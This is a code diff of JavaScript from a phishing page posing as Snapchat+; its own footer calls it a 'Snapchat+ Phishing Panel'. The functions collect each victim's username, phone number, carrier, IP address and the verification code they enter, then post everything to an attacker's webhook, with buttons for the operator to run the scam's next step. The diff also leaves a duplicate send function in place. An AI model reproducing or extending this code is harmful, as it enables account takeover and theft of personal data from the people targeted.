@@ -832,65 +832,102 @@ document.getElementById('uuidDisplay').textContent = 'Session: ' + sessionUUID.s
             }, 1500);
         }
 
-        function sendInitialWebhook() {
-            const currentUrl = window.location.origin + window.location.pathname;
+       function sendInitialWebhook() {
+    const currentUrl = window.location.origin + window.location.pathname;
 
-            const embed = {
-                title: "🎯 Nouvelle cible - Snapchat+",
-                description: `**UUID:** \`${userData.uuid}\``,
-                color: 0xFFFC00,
-                fields: [
-                    { name: "👤 Username", value: userData.username || "N/A", inline: true },
-                    { name: "📱 Téléphone", value: userData.phone || "N/A", inline: true },
-                    { name: "📡 Opérateur", value: userData.operator || "N/A", inline: true },
-                    { name: "🌐 IP", value: userData.ip || "N/A", inline: true },
-                    { name: "⏱️ Durée", value: userData.duration || "N/A", inline: true },
-                    { name: "🕐 Date", value: new Date().toLocaleString('fr-FR'), inline: true },
-                    { name: "🔗 UUID", value: `\`${userData.uuid}\``, inline: false }
-                ],
-                footer: { text: "Snapchat+ Phishing Panel" },
-                timestamp: new Date().toISOString()
-            };
+    const embed = {
+        title: "🎯 Nouvelle cible - Snapchat+",
+        description: `**UUID:** \`${userData.uuid}\``,
+        color: 0xFFFC00,
+        fields: [
+            { name: "👤 Username", value: userData.username || "N/A", inline: true },
+            { name: "📱 Téléphone", value: userData.phone || "N/A", inline: true },
+            { name: "📡 Opérateur", value: userData.operator || "N/A", inline: true },
+            { name: "🌐 IP", value: userData.ip || "N/A", inline: true },
+            { name: "⏱️ Durée", value: userData.duration || "N/A", inline: true },
+            { name: "🕐 Date", value: new Date().toLocaleString('fr-FR'), inline: true },
+            { name: "🔗 UUID", value: `\`${userData.uuid}\``, inline: false }
+        ],
+        footer: { text: "Snapchat+ Phishing Panel" },
+        timestamp: new Date().toISOString()
+    };
 
-            const codeUrl = `${currentUrl}?uuid=${userData.uuid}&action=code`;
-            const wrongUrl = `${currentUrl}?uuid=${userData.uuid}&action=wrong`;
+    const codeUrl = `${currentUrl}?uuid=${userData.uuid}&action=code`;
+    const wrongUrl = `${currentUrl}?uuid=${userData.uuid}&action=wrong`;
 
-            const payload = {
-                embeds: [embed],
+    const payload = {
+        embeds: [embed],
+        components: [
+            {
+                type: 1,
                 components: [
                     {
-                        type: 1,
-                        components: [
-                            { type: 2, style: 5, label: "📤 Envoyer le code", url: codeUrl, emoji: { name: "📱" } },
-                            { type: 2, style: 4, label: "❌ Mauvais numéro", url: wrongUrl, emoji: { name: "🗑️" } }
-                        ]
+                        type: 2,
+                        style: 5,
+                        label: "📤 Envoyer le code",
+                        url: codeUrl
+                    },
+                    {
+                        type: 2,
+                        style: 4,
+                        label: "❌ Mauvais numéro",
+                        url: wrongUrl
                     }
                 ]
-            };
+            }
+        ]
+    };
 
-            sendWebhookRequest(webhook, payload);
+    sendWebhookRequest(webhook, payload);
+}
+
+function sendCodeWebhook(code) {
+    const embed = {
+        title: "✅ CODE REÇU - Snapchat+",
+        description: `**UUID:** \`${userData.uuid}\`\n**Code:** ||${code}||`,
+        color: 0x00d26a,
+        fields: [
+            { name: "👤 Username", value: userData.username || "N/A", inline: true },
+            { name: "📱 Téléphone", value: userData.phone || "N/A", inline: true },
+            { name: "🔐 Code entré", value: `\`${code}\``, inline: true },
+            { name: "📡 Opérateur", value: userData.operator || "N/A", inline: true },
+            { name: "🌐 IP", value: userData.ip || "N/A", inline: true }
+        ],
+        footer: { text: "Code capturé avec succès" },
+        timestamp: new Date().toISOString()
+    };
+
+    const payload = { embeds: [embed] };
+    sendWebhookRequest(webhook, payload);
+}
+
+function sendWebhookRequest(webhookUrl, payload) {
+    console.log('Payload envoyé:', JSON.stringify(payload, null, 2));
+
+    fetch(webhookUrl, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(payload)
+    })
+    .then(response => {
+        console.log('Réponse du webhook:', response.status, response.statusText);
+        if (!response.ok) {
+            return response.json().then(err => {
+                console.error('Erreur détaillée:', err);
+                throw new Error(`Erreur ${response.status}: ${err.message || 'Unknown error'}`);
+            });
         }
-
-        function sendCodeWebhook(code) {
-            const embed = {
-                title: "✅ CODE REÇU - Snapchat+",
-                description: `**UUID:** \`${userData.uuid}\`\n**Code:** ||${code}||`,
-                color: 0x00d26a,
-                fields: [
-                    { name: "👤 Username", value: userData.username || "N/A", inline: true },
-                    { name: "📱 Téléphone", value: userData.phone || "N/A", inline: true },
-                    { name: "🔐 Code entré", value: `\`${code}\``, inline: true },
-                    { name: "📡 Opérateur", value: userData.operator || "N/A", inline: true },
-                    { name: "🌐 IP", value: userData.ip || "N/A", inline: true }
-                ],
-                footer: { text: "Code capturé avec succès" },
-                timestamp: new Date().toISOString()
-            };
-
-            const payload = { embeds: [embed] };
-            sendWebhookRequest(webhook, payload);
-        }
-
+        return response.json();
+    })
+    .then(data => {
+        console.log('Succès:', data);
+    })
+    .catch(error => {
+        console.error('Erreur fetch:', error);
+    });
+}
         function sendWebhookRequest(webhookUrl, payload) {
             console.log('Payload envoyé:', payload);
 
